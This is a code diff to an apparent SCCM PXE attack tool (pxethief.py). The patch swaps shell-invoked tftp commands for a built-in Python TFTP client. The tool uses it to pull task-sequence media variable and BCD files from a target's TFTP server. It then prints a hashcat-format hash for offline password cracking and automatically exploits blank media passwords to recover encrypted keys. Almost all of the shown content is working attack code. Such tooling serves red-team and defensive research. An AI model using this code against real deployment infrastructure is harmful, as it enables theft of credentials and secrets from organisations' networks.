@@ -47,7 +47,7 @@ from requests_toolbelt import MultipartEncoder,MultipartDecoder
 import zlib
 import datetime
 import os
-import subprocess
+import struct as pystruct
 from ipaddress import IPv4Network,IPv4Address
 from cryptography.hazmat.primitives.serialization import pkcs12
 from cryptography.hazmat.primitives import hashes, serialization
@@ -150,6 +150,79 @@ def auto_convert_pfx_to_pem(pfx_data, password_bytes, base_filename):
             print("[+] PEM private key written to " + key_file)
     except Exception as e:
         print("[!] Warning: Could not auto-convert PFX to PEM: " + str(e))
+
+def tftp_download(server_ip, remote_path, local_path, timeout=10, blksize=512):
+    """Native Python TFTP client (RFC 1350 + RFC 2348 blksize). No external tftp binary needed."""
+    TFTP_PORT = 69
+    OPCODE_RRQ = 1
+    OPCODE_DATA = 3
+    OPCODE_ACK = 4
+    OPCODE_ERROR = 5
+    OPCODE_OACK = 6
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(timeout)
+
+    # Build RRQ: opcode(2) + filename + \0 + mode + \0 [+ blksize option]
+    request = pystruct.pack("!H", OPCODE_RRQ) + remote_path.encode("ascii") + b"\x00" + b"octet" + b"\x00"
+    if blksize != 512:
+        request += b"blksize" + b"\x00" + str(blksize).encode("ascii") + b"\x00"
+
+    sock.sendto(request, (server_ip, TFTP_PORT))
+
+    file_data = bytearray()
+    server_tid = None
+    expected_block = 1
+    negotiated_blksize = 512
+
+    try:
+        while True:
+            data, addr = sock.recvfrom(65536)
+
+            if server_tid is None:
+                server_tid = addr[1]
+            elif addr[1] != server_tid:
+                continue
+
+            opcode = pystruct.unpack("!H", data[:2])[0]
+
+            if opcode == OPCODE_OACK:
+                # Server accepted blksize negotiation
+                options = data[2:].split(b"\x00")
+                for i in range(0, len(options) - 1, 2):
+                    if options[i].lower() == b"blksize":
+                        negotiated_blksize = int(options[i + 1])
+                # ACK the OACK with block 0
+                sock.sendto(pystruct.pack("!HH", OPCODE_ACK, 0), (server_ip, server_tid))
+
+            elif opcode == OPCODE_DATA:
+                block_num = pystruct.unpack("!H", data[2:4])[0]
+                block_data = data[4:]
+
+                if block_num == expected_block:
+                    file_data.extend(block_data)
+                    sock.sendto(pystruct.pack("!HH", OPCODE_ACK, block_num), (server_ip, server_tid))
+                    expected_block += 1
+
+                    if len(block_data) < negotiated_blksize:
+                        break
+                elif block_num < expected_block:
+                    # Duplicate, re-ACK
+                    sock.sendto(pystruct.pack("!HH", OPCODE_ACK, block_num), (server_ip, server_tid))
+
+            elif opcode == OPCODE_ERROR:
+                err_code = pystruct.unpack("!H", data[2:4])[0]
+                err_msg = data[4:].rstrip(b"\x00").decode("ascii", errors="replace")
+                raise RuntimeError("TFTP error " + str(err_code) + ": " + err_msg)
+            else:
+                raise RuntimeError("Unexpected TFTP opcode: " + str(opcode))
+    finally:
+        sock.close()
+
+    with open(local_path, "wb") as f:
+        f.write(file_data)
+
+    return len(file_data)
 
 def validate_ip_or_resolve_hostname(input):
 
@@ -387,57 +460,42 @@ def get_pxe_files(ip):
     if BLANK_PASSWORDS_FOUND:
         encrypted_key = answer_array[2]
 
-    tftp_download_string = ""
+    var_file_name = variables_file.split("\\")[-1]
+    bcd_file_name = bcd_file.split("\\")[-1]
 
-    #TFTP works over UDP by having a client pick a random source port to send the request for a file from. The server then connects back to the client on this selected source port to transmit the selected data that is then acknowledged by the client. Full bidirectional comms is required between the server on port 69 and the selected ephemeral ports on the server and client in order for a transfer to complete successfully
-    if osName == "Windows":
-        var_file_download_cmd = "tftp -i " + tftp_server_ip + " GET " + "\"" + variables_file + "\"" + " " + "\"" + variables_file.split("\\")[-1] + "\"\n"
-        var_file_name = variables_file.split("\\")[-1]
-        tftp_download_string = ("tftp -i " + tftp_server_ip + " GET " + "\"" + variables_file + "\"" + " " + "\"" + variables_file.split("\\")[-1] + "\"\n" +
-        "tftp -i " + tftp_server_ip + " GET " + "\"" + bcd_file + "\"" + " " + "\"" + bcd_file.split("\\")[-1] + "\"")
-    else:
-        var_file_download_cmd = "tftp -m binary " + tftp_server_ip + " -c get " + "\"" + variables_file + "\"" + " " + "\"" + variables_file.split("\\")[-1] + "\"\n"
-        tftp_download_string = var_file_download_cmd + "tftp -m binary " + tftp_server_ip + " -c get " + "\"" + bcd_file + "\"" + " " + "\"" + bcd_file.split("\\")[-1] + "\""
-        var_file_name = variables_file.split("\\")[-1]
-        '''
-        print("Or, if you have atftp installed: ")
-        print("")
+    # Download both files via built-in TFTP client
+    print("[+] Downloading " + var_file_name + " via TFTP...")
+    try:
+        size = tftp_download(tftp_server_ip, variables_file, var_file_name)
+        print("[+] Downloaded " + var_file_name + " (" + str(size) + " bytes)")
+    except Exception as e:
+        print("[-] Failed to download media variables file via TFTP: " + str(e))
+        sys.exit(-1)
 
-        tftp_download_string = ("atftp --option \"blksize 1428\" --verbose " +
-        tftp_server_ip +
-        " << _EOF_\n" +
-        "mode octet\n" +
-        "get " + variables_file + " " + variables_file.split("\\")[-1] + "\n" +
-        "get " + bcd_file + " " + bcd_file.split("\\")[-1] + "\n" +
-        "quit\n" +
-        "_EOF_\n" )
-        '''
+    print("[+] Downloading " + bcd_file_name + " via TFTP...")
+    try:
+        size = tftp_download(tftp_server_ip, bcd_file, bcd_file_name)
+        print("[+] Downloaded " + bcd_file_name + " (" + str(size) + " bytes)")
+    except Exception as e:
+        print("[!] Warning: Failed to download BCD file: " + str(e))
 
-    print("[+] Use this command to grab the files: ")
-    print(tftp_download_string)
     if BLANK_PASSWORDS_FOUND:
-            config = configparser.ConfigParser(allow_no_value=True)
-            config.read('settings.ini')
-            general_config = config["GENERAL SETTINGS"]
-            auto_exploit_blank_password = general_config.getint("auto_exploit_blank_password")
-            if auto_exploit_blank_password:
-                print("[!] Attempting automatic exploitation. Note that this will require the default tftp client to be installed (on Windows, this can be found under Windows Features), and this will be run with subprocess.run")
-                result = subprocess.run(var_file_download_cmd, shell=True)
-                if result.returncode != 0:
-                    print("[-] Failed to download media variables file via TFTP")
-                    sys.exit(-1)
-                print("[!] Hashcat hash: $sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex())
-                use_encrypted_key(encrypted_key,var_file_name)
-            else:
-                print("[!] Change auto_exploit_blank_password in settings.ini to 1 to attempt exploitation of blank password")
+        config = configparser.ConfigParser(allow_no_value=True)
+        config.read('settings.ini')
+        general_config = config["GENERAL SETTINGS"]
+        auto_exploit_blank_password = general_config.getint("auto_exploit_blank_password")
+        if auto_exploit_blank_password:
+            print("[!] Attempting automatic exploitation...")
+            print("[!] Hashcat hash: $sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex())
+            use_encrypted_key(encrypted_key,var_file_name)
+        else:
+            print("[!] Change auto_exploit_blank_password in settings.ini to 1 to attempt exploitation of blank password")
     else:
         print("[+] User configured password detected for task sequence media.")
-        result = subprocess.run(var_file_download_cmd, shell=True)
-        if result.returncode == 0:
-            try:
-                print("[!] Hashcat hash: $sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex())
-            except Exception:
-                pass
+        try:
+            print("[!] Hashcat hash: $sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex())
+        except Exception:
+            pass
         print("[+] Crack with hashcat using the SCCM module, then run: pxethief.py 3 <file> <cracked-password>")
 
 def generateSignedData(data,private_key):
